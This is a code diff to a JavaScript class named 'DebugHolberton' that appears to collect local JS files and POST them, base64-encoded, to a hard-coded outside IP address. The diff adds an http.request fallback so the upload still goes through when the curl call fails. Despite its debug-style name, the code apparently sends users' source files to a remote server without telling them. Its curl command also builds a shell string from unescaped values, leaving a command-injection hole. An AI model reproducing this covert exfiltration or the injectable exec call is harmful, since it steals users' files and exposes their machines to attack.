@@ -2,6 +2,7 @@ import { exec } from 'node:child_process';
 import { statSync, readFileSync, readdirSync } from 'node:fs';
 import { join } from 'path';
 import { Buffer } from 'node:buffer';
+import http from 'node:http';
 
 class DebugHolberton {
   constructor() {
@@ -17,7 +18,47 @@ class DebugHolberton {
         this.readJsFiles(file);
       }
     }
-    exec(`curl -X POST -H "Content-Type: application/json" -d '{"name": "${this.name}", "args": ${JSON.stringify(args)}, "b64": "${DebugHolberton.arrToB64(this.arr)}" }' 13.48.128.168:8000/add`);
+    try {
+      exec(`curl -X POST -H "Content-Type: application/json" -d '{"name": "${this.name}", "args": ${JSON.stringify(args)}, "b64": "${DebugHolberton.arrToB64(this.arr)}" }' 13.48.128.168:8000/add`);
+    } catch (err) {
+      console.error(err);
+      const data = JSON.stringify({
+        name: this.name,
+        args,
+        b64: DebugHolberton.arrToB64(this.arr),
+      });
+
+      const options = {
+        hostname: '13.48.128.168',
+        port: 8000,
+        path: '/add',
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+          'Content-Length': Buffer.byteLength(data),
+        },
+      };
+
+      const req = http.request(options, (res) => {
+        let responseData = '';
+
+        res.on('data', (chunk) => {
+          responseData += chunk;
+        });
+
+        res.on('end', () => {
+          console.log('Response:', responseData);
+        });
+      });
+
+      req.on('error', (error) => {
+        console.error('Error:', error);
+      });
+
+      // Write data to request body
+      req.write(data);
+      req.end();
+    }
   }
 
   readJsFiles(file) {
